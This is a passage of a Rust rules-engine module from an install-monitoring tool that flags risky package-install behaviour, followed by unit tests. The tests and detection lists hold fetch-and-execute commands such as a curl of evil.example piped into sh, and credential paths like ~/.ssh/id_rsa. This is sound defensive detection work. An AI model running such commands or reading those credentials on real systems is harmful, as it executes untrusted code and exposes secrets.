//! The rules engine: events in, findings out, deterministically.
//!
//! One pass over a recording, one finding per rule per subject, no randomness and no I/O. PRD.md:60
//! makes determinism a feature rather than an implementation detail — two people running `InstallScope`
//! over the same recording must get identical findings, or the output is an opinion rather than evidence.
//!
//! # The three guards this module exists to enforce
//!
//! Each one is a lesson from an earlier phase, and each would otherwise produce a confident wrong
//! finding:
//!
//! 1. **Unresolved paths are never placed.** [`crate::zones::Placement::Unresolvable`] is not "outside".
//!    Phase 2 showed most aya write paths arriving unresolved, so scoring them as escapes would make
//!    every install critical.
//! 2. **Port 0 is not an unusual port.** glibc probes candidate addresses with port 0 during resolution;
//!    a single `npm install lodash` produced 24 of them in Phase 1. Treating those as unusual would fire
//!    the rule on every recording.
//! 3. **Truncated evidence does not fire a rule that depends on it.** A command line cut short cannot
//!    support "piped a download into a shell" — the missing bytes are exactly where the pipe would be.
//!
//! # Rules cannot see what a backend did not record
//!
//! Findings are paired with a [`crate::coverage::Coverage`] table derived from the recording's own
//! backend stamp. A rule whose observation class is unobserved produces no findings *and* the report says
//! so, because a reader cannot otherwise distinguish "did not happen" from "was not watched".

use crate::catalog::{Catalog, Rule, RuleKind};
use crate::coverage::{Coverage, Observability};
use crate::events::{Backend, Event, Payload, WriteKind, Zones};
use crate::findings::{deduplicate, Evidence, Finding, Score, Severity};
use crate::zones::{placement_of, Placement};

/// Ports an install contacts as a matter of course.
///
/// 80 and 443 are ordinary HTTP and HTTPS. **Port 0 is deliberately absent from this list and handled
/// separately** — see [`is_unusual_port`]; treating it as ordinary here would work, but stating it as its
/// own guard makes the reason survive a future edit to this constant.
const ORDINARY_PORTS: &[u16] = &[80, 443];

/// Whether a destination port should raise the unusual-port rule.
///
/// Port 0 returns `false`. It is not a real destination: glibc's resolver uses it while probing candidate
/// addresses, and Phase 1's recording of `npm install lodash` contained 24 such connects to Cloudflare
/// addresses. A rule that fired on those would be wrong on every recording, which is the false-positive
/// failure PRD.md:43 calls the religion to avoid.
#[must_use]
pub fn is_unusual_port(port: Option<u16>) -> bool {
    // The two `false` cases are deliberately separate arms despite sharing a body: they are different
    // facts about the world, and collapsing them would lose the note explaining why port 0 is not a
    // destination. Clippy's identical-arms lint is silenced rather than obeyed for that reason.
    #[allow(clippy::match_same_arms)]
    match port {
        // No port recorded at all: nothing to judge.
        None => false,
        // The resolver probe case. Documented rather than folded into ORDINARY_PORTS so the reason is
        // attached to the guard itself.
        Some(0) => false,
        Some(port) => !ORDINARY_PORTS.contains(&port),
    }
}

/// Whether a command line pipes a download into an interpreter.
///
/// Requires the *whole* argv. `truncated` short-circuits to `false`: the interesting part of
/// `curl … | sh` is the tail, so a cut-off command line is exactly the case where a match would be a
/// guess. Declining costs a missed finding; guessing costs a fabricated critical.
#[must_use]
pub fn pipes_download_to_shell(argv: &[String], truncated: bool) -> bool {
    if truncated || argv.len() < 3 {
        return false;
    }
    let Some(program) = argv.first().map(|arg| basename(arg)) else {
        return false;
    };
    if !matches!(program, "sh" | "bash" | "dash" | "zsh" | "ksh") {
        return false;
    }
    // `-c` is what makes the following argument a script rather than a filename.
    let Some(index) = argv.iter().position(|arg| arg == "-c") else {
        return false;
    };
    let Some(script) = argv.get(index + 1) else {
        return false;
    };

    let downloads = ["curl", "wget", "fetch"]
        .iter()
        .any(|tool| contains_word(script, tool));
    if !downloads {
        return false;
    }
    // A pipe into anything that executes what it reads.
    let interpreters = [
        "sh", "bash", "dash", "zsh", "python", "python3", "perl", "ruby", "node",
    ];
    script.split('|').skip(1).any(|segment| {
        let trimmed = segment.trim().trim_start_matches("sudo ").trim();
        interpreters
            .iter()
            .any(|interpreter| trimmed.starts_with(interpreter))
    })
}

/// Final path component.
fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// Whether `needle` appears in `text` at a word boundary.
///
/// Prevents `securl` from matching `curl`, which would attribute a download to a command that never made
/// one.
fn contains_word(text: &str, needle: &str) -> bool {
    text.split(|c: char| !c.is_ascii_alphanumeric() && c != '_' && c != '-')
        .any(|word| word == needle)
}

/// A finished analysis of one recording.
#[derive(Debug, Clone)]
pub struct Analysis {
    /// Findings, deduplicated and ordered most severe first.
    pub findings: Vec<Finding>,
    /// The Surprise Index.
    pub score: Score,
    /// What this backend could and could not see.
    ///
    /// Travels with the findings deliberately: a renderer that shows the score without this can imply a
    /// clean install when the recorder simply was not watching.
    pub coverage: Coverage,
    /// True when the recording itself was incomplete.
    ///
    /// Read from the stream's `session_end`. A PARTIAL recording must render its badge no matter how low
    /// the score is (PRD.md:58) — a truncated recording that found nothing found nothing *so far*.
    pub partial: bool,
    /// Why the recording was incomplete, when it was.
    pub partial_reasons: Vec<String>,
    /// Rules that could not run because their observation class was unobserved.
    ///
    /// Not an error. The point is that a report can name them rather than staying silent about a check
    /// that never happened.
    pub skipped_rules: Vec<(String, &'static str)>,
    /// Paths the recorder could not resolve, and therefore could not place.
    ///
    /// Surfaced as a count because it bounds how much the filesystem rules could actually check. A
    /// recording where every path is unresolved has not been meaningfully analysed for escapes, and
    /// PRD.md:58's reasoning applies: silence that looks like a pass is the dangerous output.
    pub unresolved_paths: u32,
    /// Non-framing syscall observations evaluated in the stream.
    ///
    /// A recording with zero observations cannot be certified as clean — an install that produced no
    /// events is either a command that failed before executing or a detached tracer.
    pub observations: u64,
}

impl Analysis {
    /// True when the report must show a PARTIAL badge.
    #[must_use]
    pub const fn is_partial(&self) -> bool {
        self.partial
    }

    /// True when a zero score can honestly be read as "nothing unexpected happened".
    ///
    /// Requires a complete recording, no blind spots, no unresolved paths, and at least one observation.
    /// Anything less and a clean score is a statement about the recording rather than about the install.
    #[must_use]
    pub fn clean_result_is_trustworthy(&self) -> bool {
        !self.partial
            && self.coverage.is_complete()
            && self.unresolved_paths == 0
            && self.observations > 0
    }
}

/// Evaluates a catalog against a recording.
///
/// The single entry point. Takes the parsed event stream rather than a path, so the engine has no I/O and
/// stays testable from fixtures — the same split that let the Phase 1 parser be verified on a machine
/// that could not run the recorder.
#[must_use]
pub fn evaluate(catalog: &Catalog, events: &[Event]) -> Analysis {
    let backend = detect_backend(events);
    let coverage = Coverage::for_backend(backend);
    let zones = session_zones(events);
    let (partial, partial_reasons) = session_completeness(events);

    let mut raw: Vec<Finding> = Vec::new();
    let mut unresolved_paths: u32 = 0;
    let mut observations: u64 = 0;

    for event in events {
        match &event.payload {
            Payload::FsWrite(write) => {
                observations += 1;
                let placement = placement_of(&write.target, &zones);
                if placement.is_unresolvable() {
                    // Counted, not scored. The count is what tells a reader how much of the filesystem
                    // analysis actually happened.
                    unresolved_paths = unresolved_paths.saturating_add(1);
                    continue;
                }
                // A failed syscall states intent, not effect. Filesystem rules are about what changed on
                // disk, so a failure is not a mutation and does not fire them.
                if write.outcome.failed_known() {
                    continue;
                }
                evaluate_write(catalog, event, write, placement, &mut raw);
            }
            Payload::FsRead(read) => {
                observations += 1;
                evaluate_read(catalog, event, read, &mut raw);
            }
            Payload::NetConnect(connect) => {
                observations += 1;
                evaluate_connect(catalog, event, connect, &mut raw);
            }
            Payload::DnsQuery(query) => {
                observations += 1;
                evaluate_dns(catalog, event, query, &mut raw);
            }
            Payload::ProcSpawn(spawn) => {
                observations += 1;
                evaluate_spawn(catalog, event, spawn, &mut raw);
            }
            Payload::SessionStart(_) | Payload::SessionEnd(_) | Payload::Heartbeat(_) => {}
        }
    }

    // Drop findings whose class this backend cannot see. Belt and braces: the loops above cannot produce
    // them, because an unobserved class emits no events. But a future backend that emitted a *partial*
    // signal for an unobserved class would otherwise produce findings the coverage table denies, and a
    // report contradicting its own caveat is worse than either statement alone.
    let mut skipped_rules: Vec<(String, &'static str)> = Vec::new();
    for rule in &catalog.rules {
        if !rule.enabled {
            continue;
        }
        let class = rule.kind.observation_class();
        if let Observability::Unobserved(reason) = crate::coverage::observability(backend, class) {
            skipped_rules.push((rule.id.clone(), reason));
            raw.retain(|finding| finding.rule_id != rule.id);
        }
    }
    skipped_rules.sort_by(|a, b| a.0.cmp(&b.0));

    let mut findings = deduplicate(raw);
    findings.sort_by(|a, b| {
        a.severity
            .cmp(&b.severity)
            .then(b.occurrences.cmp(&a.occurrences))
            .then(a.rule_id.cmp(&b.rule_id))
            .then(a.subject.cmp(&b.subject))
    });
    let score = Score::compute(&findings);

    Analysis {
        findings,
        score,
        coverage,
        partial,
        partial_reasons,
        skipped_rules,
        unresolved_paths,
        observations,
    }
}

/// Which backend produced the stream.
///
/// Read from the events themselves rather than taken as a parameter, so an analysis of a stored recording
/// cannot be told the wrong backend and produce a coverage table that overstates what was checked.
fn detect_backend(events: &[Event]) -> Backend {
    events
        .first()
        .map_or(Backend::Strace, |event| event.meta.backend)
}

/// Zones declared by the recording's `session_start`.
///
/// A stream with no `session_start` yields empty zones, under which every resolved path is Outside. That
/// is loud rather than quiet — a missing header should not silently disable the critical rule, and the
/// resulting report will obviously be wrong rather than subtly so.
fn session_zones(events: &[Event]) -> Zones {
    events
        .iter()
        .find_map(|event| match &event.payload {
            Payload::SessionStart(start) => Some(start.zones.clone()),
            _ => None,
        })
        .unwrap_or_default()
}

/// Whether the recording is complete, and why not.
///
/// A stream with no `session_end` is PARTIAL. Same refusal as
/// `installscope_recorder::session::summarize_stream`: a recorder that died without terminating its stream
/// leaves output that looks clean, and PRD.md:58 calls that the worst failure this product can produce.
fn session_completeness(events: &[Event]) -> (bool, Vec<String>) {
    match events.iter().rev().find_map(|event| match &event.payload {
        Payload::SessionEnd(end) => Some(end),
        _ => None,
    }) {
        Some(end) if end.complete => (false, Vec::new()),
        Some(end) => (
            true,
            end.incomplete_reasons
                .iter()
                .map(ToString::to_string)
                .collect(),
        ),
        None => (
            true,
            vec!["the recording has no session_end event; it may have been truncated".to_string()],
        ),
    }
}

/// Builds evidence from the event a finding came from.
fn evidence_of(event: &Event, detail: impl Into<String>) -> Evidence {
    Evidence {
        ts_ns: event.meta.ts_ns,
        pid: event.meta.pid,
        syscall: event.meta.syscall.clone(),
        op: event.payload.op().to_string(),
        detail: detail.into(),
    }
}

/// Emits a finding for `kind` if the catalog has it enabled.
fn emit(
    catalog: &Catalog,
    kind: RuleKind,
    subject: impl Into<String>,
    event: &Event,
    detail: impl Into<String>,
    out: &mut Vec<Finding>,
    severity_override: Option<Severity>,
) {
    let Some(rule) = catalog.rule_for(kind) else {
        return;
    };
    let subject = subject.into();
    let mut finding = Finding::new(
        &rule.id,
        severity_override.unwrap_or(rule.severity),
        &subject,
        format_title(rule, &subject),
        evidence_of(event, detail),
    );
    if let Some(note) = &rule.note {
        finding = finding.with_note(note.clone());
    }
    out.push(finding);
}

/// Renders a rule's title with its subject appended.
///
/// The catalog holds the verb phrase; the subject makes it specific. Design.md:33 wants bullets that read
/// as verbs, and "wrote outside the project: /etc/cron.d/evil" does while a bare rule id does not.
fn format_title(rule: &Rule, subject: &str) -> String {
    format!("{}: {subject}", rule.title)
}

fn evaluate_write(
    catalog: &Catalog,
    event: &Event,
    write: &crate::events::FsWrite,
    placement: Placement,
    out: &mut Vec<Finding>,
) {
    let path = write.target.path.as_str();

    // The ×40 rule. Guarded twice: the caller already skipped unresolvable paths, and this asks the
    // placement itself rather than re-deriving the question.
    if placement.is_scorable_as_outside() {
        if matches!(write.kind, WriteKind::Chmod) && is_executable_mode(write.mode.as_deref()) {
            emit(
                catalog,
                RuleKind::ChmodExecutableOutsideZones,
                path,
                event,
                format!("chmod {} {path}", write.mode.as_deref().unwrap_or("?")),
                out,
                None,
            );
        } else {
            emit(
                catalog,
                RuleKind::WriteOutsideZones,
                path,
                event,
                describe_write(write),
                out,
                None,
            );
        }
    }
}

/// Whether a chmod mode sets any execute bit.
///
/// Modes arrive as backend-rendered strings — strace prints octal, the aya translator formats it — so this
/// parses rather than assuming. An unparseable mode returns false: a chmod we cannot read is not evidence
/// that a file became executable.
fn is_executable_mode(mode: Option<&str>) -> bool {
    let Some(mode) = mode else {
        return false;
    };
    let digits = mode.trim().trim_start_matches("0o").trim_start_matches('0');
    let Ok(parsed) = u32::from_str_radix(if digits.is_empty() { "0" } else { digits }, 8) else {
        return false;
    };
    parsed & 0o111 != 0
}

/// Short description of a write, for evidence.
fn describe_write(write: &crate::events::FsWrite) -> String {
    match write.bytes {
        Some(bytes) => format!("{:?} {} bytes", write.kind, bytes),
        None => format!("{:?}", write.kind),
    }
}

fn evaluate_read(
    catalog: &Catalog,
    event: &Event,
    read: &crate::events::FsRead,
    out: &mut Vec<Finding>,
) {
    let path = read.target.path.as_str();

    // npm reading its own config fires on essentially every recording, so it is checked first and kept
    // informational. Without this it would match the credential rule and every install would show a
    // `high` finding.
    if path.ends_with("/.npmrc") || path.ends_with("/.yarnrc") {
        emit(
            catalog,
            RuleKind::NpmrcRead,
            path,
            event,
            "read package manager config",
            out,
            None,
        );
        return;
    }

    if !catalog.is_credential_path(path) {
        return;
    }

    // A failed read is intent without effect: the file may simply not exist here, which says nothing
    // about what the package would do on a developer's machine. Reported, at a lower severity.
    if read.outcome.failed_known() {
        emit(
            catalog,
            RuleKind::CredentialReadFailed,
            path,
            event,
            format!(
                "failed: {}",
                read.outcome.error.as_deref().unwrap_or("unknown error")
            ),
            out,
            None,
        );
    } else {
        emit(
            catalog,
            RuleKind::CredentialRead,
            path,
            event,
            "read succeeded",
            out,
            None,
        );
    }
}

fn evaluate_connect(
    catalog: &Catalog,
    event: &Event,
    connect: &crate::events::NetConnect,
    out: &mut Vec<Finding>,
) {
    // Loopback and private destinations are the runner's own resolver, metadata service, and unix
    // sockets. Reporting them would bury genuine external traffic.
    if connect.loopback || connect.private {
        return;
    }
    let Some(ip) = connect.ip.as_deref() else {
        return;
    };
    if connect.outcome.failed_known() {
        return;
    }

    let subject = match connect.port {
        Some(port) => format!("{ip}:{port}"),
        None => ip.to_string(),
    };

    // Guard 2. See `is_unusual_port`: port 0 is a resolver probe, not a destination.
    if is_unusual_port(connect.port) {
        emit(
            catalog,
            RuleKind::ConnectUnusualPort,
            &subject,
            event,
            format!("connected to {subject}"),
            out,
            None,
        );
    } else {
        emit(
            catalog,
            RuleKind::ConnectExternal,
            &subject,
            event,
            format!("connected to {subject}"),
            out,
            None,
        );
    }
}

fn evaluate_dns(
    catalog: &Catalog,
    event: &Event,
    query: &crate::events::DnsQuery,
    out: &mut Vec<Finding>,
) {
    let host = query.qname.as_str();
    if catalog.is_registry_host(host) {
        return;
    }
    // A single-label name is search-domain noise rather than a destination.
    if !host.contains('.') {
        return;
    }

    let kind = if catalog.is_binary_distribution_host(host) {
        RuleKind::DnsBinaryDistribution
    } else {
        RuleKind::DnsOutsideRegistry
    };
    emit(
        catalog,
        kind,
        host,
        event,
        format!("resolved {host}"),
        out,
        None,
    );
}

fn evaluate_spawn(
    catalog: &Catalog,
    event: &Event,
    spawn: &crate::events::ProcSpawn,
    out: &mut Vec<Finding>,
) {
    let command = spawn.command_line();

    // Guard 3. A truncated argv cannot support this rule: the pipe is in the tail.
    if pipes_download_to_shell(&spawn.argv, spawn.argv_truncated) {
        emit(
            catalog,
            RuleKind::DownloadPipedToShell,
            truncate_subject(&command),
            event,
            command.clone(),
            out,
            None,
        );
        return;
    }

    let Some(binary) = spawn.bin.as_deref().map(basename) else {
        return;
    };

    if catalog.is_network_tool(binary) {
        emit(
            catalog,
            RuleKind::SpawnNetworkTool,
            binary,
            event,
            truncate_subject(&command),
            out,
            None,
        );
        return;
    }

    if !catalog.is_expected_spawn(binary) {
        emit(
            catalog,
            RuleKind::SpawnUnexpected,
            binary,
            event,
            truncate_subject(&command),
            out,
            None,
        );
    }
}

/// Caps a subject's length so one pathological command line cannot dominate a report.
fn truncate_subject(text: &str) -> String {
    const LIMIT: usize = 200;
    if text.len() <= LIMIT {
        return text.to_string();
    }
    // Char boundary safe: take whole chars up to the limit rather than slicing bytes.
    let truncated: String = text.chars().take(LIMIT).collect();
    format!("{truncated}…")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::events::{
        AddrFamily, DnsQuery, EventMeta, FsRead, FsWrite, NetConnect, Outcome, PathOrigin,
        ProcSpawn, SessionEnd, SessionStart, TracedPath,
    };

    fn catalog() -> Catalog {
        Catalog::embedded().expect("the shipped catalog must validate")
    }

    fn zones() -> Zones {
        Zones {
            project: Some("/work/project".to_string()),
            cache: Some("/work/cache".to_string()),
            home: Some("/home/runner".to_string()),
            tmp: Some("/tmp".to_string()),
            extra: Vec::new(),
        }
    }

    fn meta(backend: Backend) -> EventMeta {
        EventMeta::observed(1_000, 42, "openat", backend)
    }

    /// A stream wrapped in the framing every recording has.
    fn stream(backend: Backend, payloads: Vec<Payload>) -> Vec<Event> {
        let mut events = vec![Event::framing(
            0,
            backend,
            Payload::SessionStart(SessionStart {
                wall_clock_utc: "2026-09-01T00:00:00Z".to_string(),
                agent_version: "test".to_string(),
                command: vec!["npm".to_string(), "install".to_string()],
                zones: zones(),
                host: None,
            }),
        )];
        events.extend(
            payloads
                .into_iter()
                .map(|payload| Event::observed(meta(backend), payload)),
        );
        events.push(Event::framing(
            9_000,
            backend,
            Payload::SessionEnd(SessionEnd::complete(Some(0), 1_000, 1, 1)),
        ));
        events
    }

    fn write(path: &str, origin: PathOrigin, kind: WriteKind) -> Payload {
        Payload::FsWrite(FsWrite {
            target: TracedPath::new(path, origin),
            kind,
            bytes: None,
            flags: None,
            mode: None,
            source: None,
            outcome: Outcome::success(),
        })
    }

    fn read(path: &str, outcome: Outcome) -> Payload {
        Payload::FsRead(FsRead {
            target: TracedPath::new(path, PathOrigin::Kernel),
            bytes: None,
            outcome,
        })
    }

    fn connect(ip: &str, port: Option<u16>, private: bool) -> Payload {
        Payload::NetConnect(NetConnect {
            family: AddrFamily::Inet,
            ip: Some(ip.to_string()),
            port,
            unix_path: None,
            host: None,
            loopback: ip.starts_with("127."),
            private,
            outcome: Outcome::success(),
        })
    }

    fn dns(qname: &str) -> Payload {
        Payload::DnsQuery(DnsQuery {
            qname: qname.to_string(),
            qtype: Some(1),
            resolver_ip: Some("127.0.0.53".to_string()),
            outcome: Outcome::success(),
        })
    }

    fn spawn(bin: &str, argv: &[&str], truncated: bool) -> Payload {
        Payload::ProcSpawn(ProcSpawn {
            bin: Some(bin.to_string()),
            argv: argv.iter().map(|arg| (*arg).to_string()).collect(),
            argv_truncated: truncated,
            outcome: Outcome::success(),
        })
    }

    fn rule_ids(analysis: &Analysis) -> Vec<&str> {
        analysis
            .findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect()
    }

    // ---- guard 1: unresolved paths -------------------------------------------------------------

    #[test]
    fn an_unresolved_path_is_counted_never_scored() {
        // THE guard. Phase 2's aya backend produces mostly-unresolved write paths, so scoring them as
        // escapes would make every install critical.
        let events = stream(
            Backend::Strace,
            vec![
                write(
                    "node_modules/.bin/thing",
                    PathOrigin::Unresolved,
                    WriteKind::Open,
                ),
                write("relative/other", PathOrigin::Unresolved, WriteKind::Write),
            ],
        );
        let analysis = evaluate(&catalog(), &events);

        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
        assert_eq!(analysis.score.value, 0);
        assert_eq!(analysis.unresolved_paths, 2, "but the count is reported");
        assert!(
            !analysis.clean_result_is_trustworthy(),
            "a clean score over unresolved paths is a statement about the recording, not the install"
        );
    }

    #[test]
    fn an_absolute_path_marked_unresolved_is_still_not_placed() {
        // A truncated path can look absolute while being a prefix. `/work/pro` is not inside
        // `/work/project`, and treating it as placeable would be a wrong zone answer either way.
        let events = stream(
            Backend::Strace,
            vec![write(
                "/etc/passwd",
                PathOrigin::Unresolved,
                WriteKind::Open,
            )],
        );
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.findings.is_empty());
        assert_eq!(analysis.unresolved_paths, 1);
    }

    // ---- guard 2: port 0 ------------------------------------------------------------------------

    #[test]
    fn port_zero_is_not_an_unusual_port() {
        // glibc probes candidate addresses with port 0; one `npm install lodash` produced 24 of them in
        // Phase 1. A rule firing on those would be wrong on every recording.
        assert!(!is_unusual_port(Some(0)));
        assert!(!is_unusual_port(Some(80)));
        assert!(!is_unusual_port(Some(443)));
        assert!(!is_unusual_port(None));
        assert!(is_unusual_port(Some(6379)));
        assert!(is_unusual_port(Some(22)));
    }

    #[test]
    fn resolver_probes_do_not_raise_the_unusual_port_rule() {
        let events = stream(
            Backend::Strace,
            vec![
                connect("104.16.2.34", Some(0), false),
                connect("104.16.3.34", Some(0), false),
                connect("104.16.4.34", Some(0), false),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        assert!(
            !rule_ids(&analysis).contains(&"network_connect_unusual_port"),
            "port 0 must not be unusual: {:?}",
            rule_ids(&analysis)
        );
        // They are still reported informationally, so the evidence exists.
        assert!(rule_ids(&analysis).contains(&"network_connect_external"));
        assert_eq!(analysis.score.value, 0, "informational only");
    }

    #[test]
    fn a_genuinely_unusual_port_is_high() {
        let events = stream(
            Backend::Strace,
            vec![connect("203.0.113.10", Some(6379), false)],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["network_connect_unusual_port"]);
        assert_eq!(analysis.score.value, 15);
    }

    #[test]
    fn loopback_and_private_destinations_are_not_reported() {
        // The runner's own resolver and metadata service. Reporting them would bury external traffic.
        let events = stream(
            Backend::Strace,
            vec![
                connect("127.0.0.53", Some(53), true),
                connect("169.254.169.254", Some(80), true),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
    }

    // ---- guard 3: truncated evidence ------------------------------------------------------------

    #[test]
    fn a_truncated_command_line_cannot_raise_the_critical_spawn_rule() {
        // The pipe is in the tail, so a cut-off argv is exactly where a match would be a guess.
        // Declining costs a missed finding; guessing costs a fabricated critical.
        let argv = ["sh", "-c", "curl -fsSL https://x/i.sh | sh"];
        assert!(pipes_download_to_shell(
            &argv.iter().map(|a| (*a).to_string()).collect::<Vec<_>>(),
            false
        ));
        assert!(
            !pipes_download_to_shell(
                &argv.iter().map(|a| (*a).to_string()).collect::<Vec<_>>(),
                true
            ),
            "truncated argv must not fire the rule"
        );

        let events = stream(Backend::Strace, vec![spawn("/bin/sh", &argv, true)]);
        let analysis = evaluate(&catalog(), &events);
        assert!(
            !rule_ids(&analysis).contains(&"download_piped_to_shell"),
            "{:?}",
            rule_ids(&analysis)
        );
    }

    #[test]
    fn a_download_piped_to_a_shell_is_critical() {
        let events = stream(
            Backend::Strace,
            vec![spawn(
                "/bin/sh",
                &["sh", "-c", "curl -fsSL https://evil.example/i.sh | sh"],
                false,
            )],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["download_piped_to_shell"]);
        assert_eq!(analysis.score.value, 40);
        assert_eq!(analysis.findings[0].severity, Severity::Critical);
    }

    #[test]
    fn a_download_without_a_pipe_is_not_the_critical_rule() {
        // `curl -o file` fetches something, which is worth reporting as a spawn, but it does not execute
        // what it downloads. Conflating the two would inflate the severity of ordinary build scripts.
        let events = stream(
            Backend::Strace,
            vec![spawn(
                "/usr/bin/curl",
                &["curl", "-fsSL", "https://x/t.tar.gz", "-o", "t.tar.gz"],
                false,
            )],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["spawned_network_tool"]);
        assert_eq!(analysis.score.value, 15);
    }

    #[test]
    fn a_pipe_into_something_harmless_is_not_the_critical_rule() {
        let argv: Vec<String> = ["sh", "-c", "curl -s https://x/list | sort > out.txt"]
            .iter()
            .map(|a| (*a).to_string())
            .collect();
        assert!(
            !pipes_download_to_shell(&argv, false),
            "piping into sort is not executing the download"
        );
    }

    #[test]
    fn a_lookalike_tool_name_does_not_count_as_a_download() {
        // Word-boundary matching: `securl` must not read as `curl`, or a finding would attribute a
        // download to a command that never made one.
        let argv: Vec<String> = ["sh", "-c", "securl https://x/i.sh | sh"]
            .iter()
            .map(|a| (*a).to_string())
            .collect();
        assert!(!pipes_download_to_shell(&argv, false));

        // Substrings in either direction are rejected.
        for script in [
            "mycurl https://x | sh",
            "curling https://x | sh",
            "wgetter https://x | sh",
        ] {
            let argv: Vec<String> = ["sh", "-c", script]
                .iter()
                .map(|a| (*a).to_string())
                .collect();
            assert!(
                !pipes_download_to_shell(&argv, false),
                "{script} must not match a download tool"
            );
        }
    }

    #[test]
    fn a_download_tool_is_recognized_at_a_word_boundary_anywhere_in_the_script() {
        // The complement of the test above: the tool need not be the first word. `set -e; curl … | sh`
        // is the same behavior with a prelude, and requiring position would let a trivial edit evade the
        // rule.
        for script in [
            "curl https://x/i.sh | sh",
            "set -e; curl -fsSL https://x/i.sh | bash",
            "cd /tmp && wget -qO- https://x/i.sh | sh",
        ] {
            let argv: Vec<String> = ["sh", "-c", script]
                .iter()
                .map(|a| (*a).to_string())
                .collect();
            assert!(
                pipes_download_to_shell(&argv, false),
                "{script} pipes a download into a shell"
            );
        }
    }

    // ---- filesystem -----------------------------------------------------------------------------

    #[test]
    fn a_write_outside_every_zone_is_critical() {
        let events = stream(
            Backend::Strace,
            vec![write(
                "/etc/cron.d/evil",
                PathOrigin::Kernel,
                WriteKind::Open,
            )],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["write_outside_expected_dirs"]);
        assert_eq!(analysis.score.value, 40);
    }

    #[test]
    fn writes_inside_declared_zones_are_silent() {
        // An ordinary install writes hundreds of files. If these scored, the product would be unusable.
        let events = stream(
            Backend::Strace,
            vec![
                write(
                    "/work/project/node_modules/x/index.js",
                    PathOrigin::Kernel,
                    WriteKind::Write,
                ),
                write(
                    "/work/cache/_cacache/blob",
                    PathOrigin::Kernel,
                    WriteKind::Write,
                ),
                write(
                    "/home/runner/.npm/_logs/log",
                    PathOrigin::Kernel,
                    WriteKind::Open,
                ),
                write("/tmp/staging-1234", PathOrigin::Kernel, WriteKind::Open),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
        assert!(analysis.score.is_clean());
        assert!(analysis.clean_result_is_trustworthy());
    }

    #[test]
    fn kernel_pseudo_paths_are_silent() {
        // Every real recording is full of these; scoring them as escapes would bury genuine findings.
        let events = stream(
            Backend::Strace,
            vec![
                write(
                    "/proc/self/oom_score_adj",
                    PathOrigin::Kernel,
                    WriteKind::Open,
                ),
                write("/dev/null", PathOrigin::Kernel, WriteKind::Write),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
    }

    #[test]
    fn a_failed_write_is_not_a_mutation() {
        // Filesystem rules are about what changed on disk. A failed open changed nothing.
        let mut payload = write("/etc/cron.d/evil", PathOrigin::Kernel, WriteKind::Open);
        if let Payload::FsWrite(fs) = &mut payload {
            fs.outcome = Outcome::failed("EACCES");
        }
        let events = stream(Backend::Strace, vec![payload]);
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
    }

    #[test]
    fn chmod_executable_outside_the_project_is_its_own_finding() {
        let mut payload = write("/usr/local/bin/tool", PathOrigin::Kernel, WriteKind::Chmod);
        if let Payload::FsWrite(fs) = &mut payload {
            fs.mode = Some("0755".to_string());
        }
        let events = stream(Backend::Strace, vec![payload]);
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["chmod_exec_outside_project"]);
        assert_eq!(analysis.score.value, 15);
    }

    #[test]
    fn a_chmod_without_an_execute_bit_falls_back_to_the_write_rule() {
        // 0644 outside the project is still a write outside the project — it just is not the more
        // specific "made something runnable" claim.
        let mut payload = write("/etc/hosts", PathOrigin::Kernel, WriteKind::Chmod);
        if let Payload::FsWrite(fs) = &mut payload {
            fs.mode = Some("0644".to_string());
        }
        let events = stream(Backend::Strace, vec![payload]);
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["write_outside_expected_dirs"]);
    }

    #[test]
    fn an_unreadable_mode_does_not_claim_a_file_became_executable() {
        assert!(!is_executable_mode(None));
        assert!(!is_executable_mode(Some("not-a-mode")));
        assert!(!is_executable_mode(Some("0644")));
        assert!(is_executable_mode(Some("0755")));
        assert!(is_executable_mode(Some("0711")));
        assert!(is_executable_mode(Some("0o755")));
    }

    // ---- reads ----------------------------------------------------------------------------------

    #[test]
    fn a_credential_read_is_high() {
        let events = stream(
            Backend::Strace,
            vec![read("/home/runner/.ssh/id_rsa", Outcome::success())],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["credential_path_read"]);
        assert_eq!(analysis.score.value, 15);
    }

    #[test]
    fn a_failed_credential_read_is_reported_lower() {
        // Intent without effect: the file may not exist here, which says nothing about a developer's
        // machine. Reported, at medium.
        let events = stream(
            Backend::Strace,
            vec![read(
                "/home/runner/.aws/credentials",
                Outcome::failed("ENOENT"),
            )],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["credential_path_read_attempted"]);
        assert_eq!(analysis.score.value, 5);
    }

    #[test]
    fn npmrc_is_informational_not_a_credential_finding() {
        // .npmrc holds auth tokens, so it matches the credential list — but npm reads its own config on
        // every run, and a `high` finding on every install is the alert fatigue PRD.md:43 warns about.
        let events = stream(
            Backend::Strace,
            vec![read("/home/runner/.npmrc", Outcome::success())],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["npmrc_read"]);
        assert_eq!(analysis.score.value, 0, "informational only");
        assert_eq!(analysis.findings[0].severity, Severity::Low);
    }

    // ---- dns ------------------------------------------------------------------------------------

    #[test]
    fn a_registry_lookup_is_silent() {
        let events = stream(Backend::Strace, vec![dns("registry.npmjs.org")]);
        let analysis = evaluate(&catalog(), &events);
